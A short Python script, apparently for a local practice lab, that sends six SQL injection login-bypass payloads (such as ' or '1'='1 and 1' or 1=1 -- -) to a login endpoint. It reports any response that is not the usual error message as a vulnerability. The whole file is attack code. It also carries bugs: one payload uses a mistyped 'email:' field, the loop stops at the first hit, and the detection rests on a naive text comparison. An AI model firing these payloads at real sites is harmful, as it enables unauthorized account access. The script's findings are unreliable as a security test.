import requests
from bs4 import BeautifulSoup


def input_values(email):
    """returns 6 different values of SQL injection of email and passwords"""
    attack_1 = {"email": email,
                "password": "' or '1'='1	"}
    attack_2 = {"email:": email,
                "password": "' or 1='1	"}
    attack_3 = {"email": email,
                "password": "1' or 1=1 -- -	"}
    attack_4 = {"email": "' or '1'='1	",
                "password": "' or '1'='1	"}
    attack_5 = {"email": "' or ' 1=1	",
                "password": "' or ' 1=1	"}
    attack_6 = {"email": "1' or 1=1 -- -	",
                "password": "12345678"}
    values_list = [attack_1, attack_2, attack_3, attack_4, attack_5, attack_6]
    return values_list


def check_login(url, values):
    """sends sqli to the login page and returns True if sqli vulnerabilities are found, False otherwise"""
    weakness_count = []
    for input_value in values:
        response = requests.post(url, data=input_value)
        web_warning_message = 'Invalid email or password.'
        web_response = response.text
        if web_response != (web_warning_message):
            weakness_count.append(input_value)
            return f"Security weakness: {len(weakness_count)}\n[*] {input_value}"


if __name__ == "__main__":
    try:
        print("\t-- SQL INJECTION ATTACK --\n")
        email = "admin@gmail.com"
        url = "http://localhost:3000/#/login"
        values = input_values(email)
        print(check_login(url, values))


    except:
        print("SYSTEM MESSAGE:\n\t[X] Automatic test failed...")
